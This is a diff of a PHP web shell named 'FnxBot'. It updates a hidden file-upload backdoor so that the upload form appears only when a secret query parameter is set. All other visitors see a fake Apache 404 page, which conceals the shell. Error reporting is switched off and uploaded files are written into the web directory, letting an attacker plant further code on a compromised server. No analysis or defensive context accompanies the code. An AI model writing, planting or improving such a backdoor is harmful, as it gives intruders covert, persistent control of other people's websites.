@@ -1,15 +1,21 @@
-<?php
+<?php 
 error_reporting(0);
-$systemx = $_GET["Fnx"];
-if ($systemx == "|||") {
-    echo '<h1>FnxBot</h1>';
-    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-    echo '<input type="file" name="file" size="50"><input name="Fnx" type="submit" id="_upl" value="Upload"></form>';
-    if( $_POST['Fnx'] == "Upload" ) {
-    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded<b><br><br>'; }
-    else { echo '<b>Not Uploaded</b><br><br>'; }
-    }
-} else {
-    echo "Not Found";
-}
+if ($_GET["Fnx"] == "0x17865"){
+echo "<h1>FnxBotV1</h1>";
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
+echo '<b>Uploaded</b><br><br>'; 
+}else { echo 'Not Uploaded</b><br><br>'; }}
+}else{
+$domain = $_SERVER['SERVER_NAME'];
+echo'<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.38 (Ubuntu) Server at '.$domain.' Port 443</address>
+</body></html>';}
 ?>
